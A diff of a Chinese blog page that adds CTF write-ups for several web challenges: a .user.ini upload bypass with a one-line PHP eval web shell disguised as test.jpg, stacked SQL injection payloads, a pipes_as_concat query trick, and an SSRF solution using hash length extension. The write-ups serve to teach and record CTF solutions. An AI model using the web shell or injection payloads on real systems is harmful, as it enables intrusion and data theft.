@@ -9,12 +9,9 @@
     
     <meta name="author" content="Ycj">
     
-    <meta name="description" content="checkin  提示中有源码，首先看看源码，发现ph和htaccess都被过滤，文件内容也不能有&amp;lt;?，在网上看到了一个姿势，
-user.ini构建后门 在这里记录一下用这个姿势的条件
-1.上传目录下要有可执行的php文件。
-2.服务器使用CGI/FastCGI模式
-创建user.ini写入
-">
+    <meta name="description" content="checkin​    是一道文件上传题，首先抓包分析一波，发现&amp;lt;?,php,等都不行，直接上传基本凉凉，于是考虑解析漏洞。
+​    发现题目服务端是nginx，htaccess也不行，在网上看到了一个姿势，user.ini构建后门 在这里记录一下用这个姿势的条件
+​    1.上传目录下要">
     
     
     
@@ -78,7 +75,7 @@ user.ini构建后门 在这里记录一下用这个姿势的条件
     </p>
   <p class="article-time">
     <time datetime="2019-09-09T16:00:00.000Z" itemprop="datePublished">2019-09-10</time>
-    Updated:<time datetime="2019-09-10T13:05:20.431Z" itemprop="dateModified">2019-09-10</time>
+    Updated:<time datetime="2019-10-11T04:51:21.442Z" itemprop="dateModified">2019-10-11</time>
     
   </p>
 </header>
@@ -87,17 +84,62 @@ user.ini构建后门 在这里记录一下用这个姿势的条件
 		
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
-		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li></ol>
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-tornado"><span class="toc-number">1.1.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#随便注"><span class="toc-number">1.2.</span> <span class="toc-text">随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easysql"><span class="toc-number">1.3.</span> <span class="toc-text">easysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRFME"><span class="toc-number">1.4.</span> <span class="toc-text">SSRFME</span></a></li></ol></li></ol>
 		</div>
 		
-		<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>  提示中有源码，首先看看源码，发现ph和htaccess都被过滤，文件内容也不能有&lt;?，在网上看到了一个姿势，</p>
-<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini构建后门</a> 在这里记录一下用这个姿势的条件</p>
-<p>1.上传目录下要有可执行的php文件。</p>
-<p>2.服务器使用CGI/FastCGI模式</p>
-<p>创建user.ini写入</p>
+		<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>​    是一道文件上传题，首先抓包分析一波，发现&lt;?,php,等都不行，直接上传基本凉凉，于是考虑解析漏洞。</p>
+<p>​    发现题目服务端是nginx，htaccess也不行，在网上看到了一个姿势，<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini构建后门</a> 在这里记录一下用这个姿势的条件</p>
+<p>​    1.上传目录下要有可执行的php文件。</p>
+<p>​    2.服务器使用CGI/FastCGI模式</p>
+<p>​    3.php版本要在5.3.0后</p>
+<p>​    创建user.ini写入</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a  </span><br><span class="line"><span class="attr">auto_prepend_file</span>=test.jpg</span><br></pre></td></tr></table></figure>
 
-<p>## </p>
+<p>​    于是上传一句话木马,名为test.jpg</p>
+<p><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;aa&#39;]);&lt;/script&gt;</code></p>
+<p>​    这样我们的文件就会被包含到同目录中的那个index.php中了，接下来的操作就不说了。</p>
+<h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>​    这道题算是我做过的第一道ssti题目，首先发现提示中的render可以知道该题使用tornado模板写的，参考writeup，发现tornado的配置可以放在handler.settings中于是得到payload: <code></code>得到secret_cookie。</p>
+<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>​    随便注了一下发现基本都被过滤了T_T!<img src="https://i.loli.net/2019/10/10/nqau2sQf315WjHx.png" alt></p>
+<p>​    看了网上的wp，发现这是一道堆叠注入。emmm，这里就不再赘述了，记录一下网上的各种payload</p>
+<p> 方法1：存储过程绕过</p>
+<p>​    1.把关键字编程哈希值绕过                                      </p>
+<p> payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27;<span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span>%<span class="number">20</span>execsql%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>@a;<span class="keyword">execute</span>%<span class="number">20</span>execsql;</span><br></pre></td></tr></table></figure>
+
+<p>​    2.使用concat连接关键字</p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="keyword">use</span> supersqli;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect `flag` from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>方法2:重命名表名，字段名</p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">add</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="literal">NULL</span>);<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">to</span> <span class="string">`tmp`</span>;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>​    这里涉及MYSQL的一种管道符模式。可以在MYSQL中开启支持管道符来进行字符串的拼接操作。构造payload :</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>条件：查询语句中有||。</p>
+<p>​    还有一种payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,2</span><br></pre></td></tr></table></figure>
+
+<p>​    这种也比较好理解，这样就把查询语句分成了两部分</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="SSRFME"><a href="#SSRFME" class="headerlink" title="SSRFME"></a>SSRFME</h2><p>​    方法一：字符串拼接</p>
+<p>​    源码中生成sign是这样一行代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
+
+<p>​    你得到sign是这样的</p>
+<p><img src="https://i.loli.net/2019/10/11/Ku8v9wAXGfrVhU4.png" alt></p>
+<p>​    你只能得到secret_key+param+scan的值。</p>
+<p>​    签名检测代码是这样的</p>
+<p><img src="https://i.loli.net/2019/10/11/IBPZfykxGv8wgdS.png" alt></p>
+<p>​    然后看到exec()里的代码(代码就不帖了)，就可以得到解题方法：用scan来读flag.txt中的值保存到result.txt中，然后用read把它读出来。</p>
+<p>​    所以访问/De1ta，payload:param=flag.txt,通过cookie上传action=readscan,sign的值可以通过访问/getSign上传param=flag.txtread来获得。这样两种sign都是secert_key+flag.txt+readscan，完美的拼接成功拿到flag</p>
+<p>​    方法二：local_file读取文件</p>
+<p>​    先生成已知值：md5(secret_key+local-file:///proc/self/cwd/flag.txt +scan)然后用hashpump生成MD5(secret_key+local-file:///proc/self/cwd/flag.txt +scan+read)的值就行了。</p>
+<p>​    ps:local-file:///proc/self/cwd/代表当前目录，local-file一定要绝对地址。</p>
+<p>这里推荐一个详细的writeup</p>
+<p><a href="https://xz.aliyun.com/t/6050" target="_blank" rel="noopener">SSRFME一题三解</a></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -138,7 +180,7 @@ user.ini构建后门 在这里记录一下用这个姿势的条件
 
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
-  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li></ol>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-tornado"><span class="toc-number">1.1.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#随便注"><span class="toc-number">1.2.</span> <span class="toc-text">随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easysql"><span class="toc-number">1.3.</span> <span class="toc-text">easysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRFME"><span class="toc-number">1.4.</span> <span class="toc-text">SSRFME</span></a></li></ol></li></ol>
   </div>
 
 <div id="asidepart">
